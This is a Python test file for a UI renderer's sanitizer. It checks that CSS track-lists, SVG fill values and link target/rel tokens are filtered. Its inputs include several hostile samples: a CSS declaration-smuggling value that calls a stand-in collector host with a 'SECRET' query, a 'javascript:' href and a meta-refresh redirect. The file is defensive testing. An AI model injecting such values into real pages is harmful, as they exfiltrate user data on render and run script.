"""The emission grammar for string-typed slots, in EMITTED BYTES.

A handful of wire slots are typed as a plain ``str`` and carry a grammar the type
does not state — a CSS track-list (a grid's ``templateColumns``), an SVG paint (a
draw style's ``fill`` / ``stroke``), and the two anchor token slots (a link's
``target`` / ``rel``). This renderer concatenated ``templateColumns`` into
``style="grid-template-columns:…"`` with no rule at all, so a value carrying
``;background:url(https://collector/?d=…)`` closed the declaration, opened a
second one the document never wrote, and fetched on RENDER, with no user act,
outside the egress policy that governs every href and src in the same document —
while the React client assigned a style OBJECT and the browser dropped the
identical value silently. Same tree, exfiltration channel here, inert there.

Two disciplines, mirroring the sibling hosts' corpora so the hosts cannot drift
on safety:

1. **Every refusal test has an allow twin.** A gate that refuses everything
   passes every refusal assertion ever written, so a corpus of refusals alone
   cannot tell "the grammar works" from "the renderer is broken". The allow
   twins go red if the grammar is tightened past what a legitimate document
   says — which is why the named colour is among them.
2. **The rendered bytes, through the ordinary entry point.** Every render test
   calls ``render_html``. A test that called ``sanitize_css_value`` directly and
   asserted on its result would keep passing on the day someone removed the call
   from the grid arm, which is precisely the failure this closes.
"""

from __future__ import annotations

import json

from fuaran_py import decode_node
from fuaran_py.renderer import render_html
from fuaran_py.renderer.sanitize import (
    CSS_REFUSAL_ATTRIBUTE,
    is_safe_css_value,
    sanitize_css_value,
    sanitize_link_anchor,
    sanitize_markdown_html,
    sanitize_paint_value,
)


def _render(wire: str) -> str:
    result = decode_node(wire)
    assert result.ok, getattr(result, "error", result)
    return render_html(result.value)


def _grid(template: str | None) -> str:
    layout: dict[str, object] = {"$type": "Grid", "cols": 2}
    if template is not None:
        layout["templateColumns"] = template
    return json.dumps({"id": "g", "kind": {"$type": "Box", "children": [], "layout": layout, "role": "Group"}})


def _painted(fill: str) -> str:
    return json.dumps(
        {
            "id": "d",
            "kind": {
                "$type": "Drawing",
                "shapes": [
                    {
                        "$type": "Circle",
                        "cx": 5,
                        "cy": 5,
                        "r": 2,
                        "style": {"fill": {"$type": "Static", "value": fill}},
                    }
                ],
                "style": {},
                "viewBox": {"height": 10, "minX": 0, "minY": 0, "width": 10},
            },
        }
    )


def _link(target: str | None = None, rel: str | None = None) -> str:
    kind: dict[str, object] = {
        "$type": "Link",
        "download": False,
        "href": {"$type": "Static", "value": "/about"},
        "label": "About",
    }
    if rel is not None:
        kind["rel"] = rel
    if target is not None:
        kind["target"] = target
    return json.dumps({"id": "l", "kind": kind})


# ─── CSS track-list ─────────────────────────────────────────────────────────


def test_hostile_template_columns_emits_nothing_and_is_marked() -> None:
    html = _render(_grid("1fr;background:url(https://collector.example/?d=SECRET)"))
    assert "collector.example" not in html
    assert "SECRET" not in html
    assert "url(" not in html
    # The marker carries the SLOT and never the value — the same bound every
    # other denial here keeps, because a refused value IS the payload.
    assert f'{CSS_REFUSAL_ATTRIBUTE}="grid-template-columns"' in html


def test_allow_twin_real_track_lists_render_verbatim_and_unmarked() -> None:
    # If this fails the grammar has become unusable rather than strict, and
    # every irregular grid in the estate is broken.
    for template in ("1fr 2fr auto", "repeat(auto-fit, minmax(150px, 1fr))", "min-content max-content"):
        html = _render(_grid(template))
        assert f"grid-template-columns:{template}" in html
        assert CSS_REFUSAL_ATTRIBUTE not in html


def test_a_grid_declaring_no_template_is_unchanged_from_before_the_gate() -> None:
    # The gate must be invisible where nothing declared anything. This fails if
    # ``sanitize_css_value_for_slot`` ever starts rewriting rather than passing
    # through.
    html = _render(_grid(None))
    assert "grid-template-columns:repeat(2, 1fr)" in html
    assert CSS_REFUSAL_ATTRIBUTE not in html


# ─── SVG paint ──────────────────────────────────────────────────────────────


def test_a_paint_server_reference_is_refused_to_none() -> None:
    # ``url(https://collector/x)`` contains no forbidden CHARACTER, so it passes
    # the generic CSS rule. In an SVG ``fill`` it names a paint server the user
    # agent FETCHES. Only a positive grammar excludes it.
    html = _render(_painted("url(https://collector.example/x)"))
    assert "collector.example" not in html
    # ``none`` rather than empty: an empty ``fill`` INHERITS the enclosing
    # group's paint instead of clearing it.
    assert 'fill="none"' in html


def test_allow_twin_hex_named_colours_and_functions_survive() -> None:
    # The named colour is the load-bearing one. An enumerated keyword list
    # refuses ``steelblue``, and its failure mode is silent: the shape is
    # repainted, not reported.
    for paint in ("#39c", "#336699", "steelblue", "currentColor", "rgb(1 2 3)"):
        html = _render(_painted(paint))
        assert f'fill="{paint}"' in html


# ─── Anchor token slots ─────────────────────────────────────────────────────


def test_rel_opener_on_blank_is_dropped_and_the_safe_pair_is_forced() -> None:
    # The whole finding in one case. ``opener`` re-enables ``window.opener`` on
    # a ``_blank`` link, handing the opened document a live reference to this
    # one — and browsers imply ``noopener`` there, which is exactly why an
    # explicit ``opener`` mattered: it OVERRIDES a user-agent default no
    # document can know the version floor of.
    html = _render(_link(target="_blank", rel="opener"))
    assert 'rel="noopener noreferrer"' in html
    assert 'target="_blank"' in html


def test_a_target_outside_the_closed_set_is_omitted_not_substituted() -> None:
    # Omitting says truthfully that the document declared nothing this renderer
    # could honour. Substituting ``_self`` would put a value in the DOM the
    # author never wrote, and the two are the same navigation anyway.
    for target in ("victim", "_parent", "_top"):
        html = _render(_link(target=target))
        assert "target=" not in html
        assert target not in html


def test_allow_twin_self_with_a_descriptive_rel_forces_nothing() -> None:
    html = _render(_link(target="_self", rel="nofollow"))
    assert 'target="_self"' in html
    assert 'rel="nofollow"' in html
    assert "noopener" not in html

    bare = _render(_link())
    assert "rel=" not in bare
    assert "target=" not in bare


# ─── The markdown sweep ─────────────────────────────────────────────────────


def test_the_protocol_sweep_is_tag_anchored_and_the_element_match_is_delimited() -> None:
    # Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
    # hazard could not state it, because the literal token in a ``<code>``
    # element's TEXT was replaced with ``about:blank``. And an undelimited
    # element match is a match on a DIFFERENT element — ``<metadata>`` is not
    # ``<meta>``, and ``<linearGradient>`` is not ``<link>``, both of which the
    # drawing builder emits.
    prose = sanitize_markdown_html("<p>Never write <code>javascript:</code> in an href</p>")
    assert "javascript:" in prose

    attr = sanitize_markdown_html('<a href="javascript:alert(1)">x</a>')
    assert "javascript:" not in attr
    assert "about:blank" in attr

    assert "<meter" in sanitize_markdown_html('<p><meter value="0.6"></meter></p>')
    assert "evil" not in sanitize_markdown_html('<meta http-equiv="refresh" content="0;url=http://evil">')


# ─── The go-red self-test ───────────────────────────────────────────────────


def test_the_grammar_itself_refuses_and_admits_the_right_things() -> None:
    # Without this, a bug that made every CSS value empty for an unrelated
    # reason would read above as a gate working.
    assert not is_safe_css_value("1fr;background:url(x)")
    assert is_safe_css_value("clamp(1rem, 2vw, 3rem)")
    assert not is_safe_css_value("URL\n(x)")
    assert sanitize_css_value("a}b{color:red") == ""
    assert sanitize_paint_value("url(#grad)") == "none"
    assert sanitize_link_anchor("_blank", None) == ("_blank", "noopener noreferrer")
